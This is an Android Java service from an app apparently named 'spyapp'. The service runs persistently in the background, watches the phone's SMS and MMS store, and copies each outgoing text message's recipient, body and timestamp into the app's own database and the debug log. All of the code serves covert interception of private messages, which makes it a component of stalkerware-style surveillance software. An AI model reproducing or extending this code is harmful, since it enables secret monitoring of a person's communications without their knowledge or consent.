package com.app.spyapp.receiver;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.SMSModel;

import java.sql.Date;

/**
 * Created by Ankit on 5/10/2016.
 */
public class SendSMSInfoService extends Service {

    private ContentResolver contentResolver;
    long lastTimeofCall = 0L;
    long lastTimeofUpdate = 0L;
    long threshold_time = 10000;
    private SpyApp spyApp;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        spyApp = (SpyApp) getApplicationContext();
        Log.i("Debug", " service creatd.........");
    }

    public void registerObserver() {

        contentResolver = getContentResolver();
        contentResolver.registerContentObserver(
                Uri.parse("content://mms-sms/conversations/"),
                true, new SMSObserver(new Handler()));
        Log.i("Debug", " in registerObserver method.........");
    }

    //start the service and register observer for lifetime
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        registerObserver();

        return START_STICKY;
    }

    class SMSObserver extends ContentObserver {

        public SMSObserver(Handler handler) {
            super(handler);
        }

        //will be called when database get change
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);


  /*first of all we need to decide message is Text or MMS type.*/
//            final String[] projection = new String[]{
//                    "_id", "ct_t"};

            final String[] projection = new String[]{
                    "_id", "ct_t"};
            Uri mainUri = Uri.parse(
                    "content://mms-sms/conversations/");
            Cursor mainCursor = contentResolver.
                    query(mainUri, projection,
                            null, null, null);
            mainCursor.moveToFirst();

            String msgContentType = mainCursor.getString(mainCursor.
                    getColumnIndex("ct_t"));
            if ("application/vnd.wap.multipart.related".
                    equals(msgContentType)) {
                // it's MMS

                //now we need to decide MMS message is sent or received
                Uri mUri = Uri.parse("content://mms");
                Cursor mCursor = contentResolver.query(mUri, null, null,
                        null, null);
                mCursor.moveToNext();
                int type = mCursor.getInt(mCursor.getColumnIndex("type"));

                if (type == 1) {
                    //it's received MMS
                    WriteLog.E(SendSMSInfoService.class.getSimpleName(), "it's received MMS");
                } else if (type == 2) {
                    //it's sent MMS
                    WriteLog.E(SendSMSInfoService.class.getSimpleName(), "it's Sent MMS");
                }

            } else {
                // it's SMS
                Log.i("Debug", "it's SMS");

                //now we need to decide SMS message is sent or received
                Uri mUri = Uri.parse("content://sms");
                Cursor mCursor = contentResolver.query(mUri, null, null,
                        null, null);
                mCursor.moveToNext();
                int type = mCursor.getInt(mCursor.getColumnIndex("type"));

                if (type == 1) {
                    //it's received SMS
                    WriteLog.E(SendSMSInfoService.class.getSimpleName(), "it's received SMS");
                } else if (type == 2) {
                    //it's sent SMS
                    lastTimeofCall = System.currentTimeMillis();
                    if (lastTimeofCall - lastTimeofUpdate > threshold_time) {

                        //write your code to find updated contacts here
                        WriteLog.E(SendSMSInfoService.class.getSimpleName(), "Message is Sending");
                        getSentSMSinfo();
                        lastTimeofUpdate = System.currentTimeMillis();
                    }
                }
            }//message content type block closed


        }//on changed closed

 /*now Methods start to getting details for sent-received SMS*/

        //method to get details about Sent SMS...........
        private void getSentSMSinfo() {
            Uri uri = Uri.parse("content://sms/sent");
            String str = "";
            Cursor cursor = contentResolver.query(uri, null,
                    null, null, null);
            cursor.moveToNext();

            // 2 = sent, etc.
            int type = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String msg_id = cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            String body = cursor.getString(cursor.
                    getColumnIndex("body"));
            Date date = new Date(Long.valueOf(dateVal));

            str = "Sent SMS: \n phone is: " + phone;
            str += "\n SMS type is: " + type;
            str += "\n SMS time stamp is:" + date;
            str += "\n SMS body is: " + body;
            str += "\n id is : " + msg_id;


            Log.i("Debug", "sent SMS phone is: " + phone);
            Log.i("Debug", "SMS type is: " + type);
            Log.i("Debug", "SMS time stamp is:" + date);
            Log.i("Debug", "SMS body is: " + body);
            Log.i("Debug", "SMS id is: " + msg_id);

            SMSModel smsModel = new SMSModel();
            smsModel.setMessageId(msg_id);
            smsModel.setMsg(body);
            smsModel.setAddress(phone);
            smsModel.setType(Const.TYPE_SENT_STRING);
            smsModel.setDate(Utils.convertMilisToDate(date.getTime()));
            spyApp.getDatabaseHelper().insertSMS(smsModel);

        }
    }

}
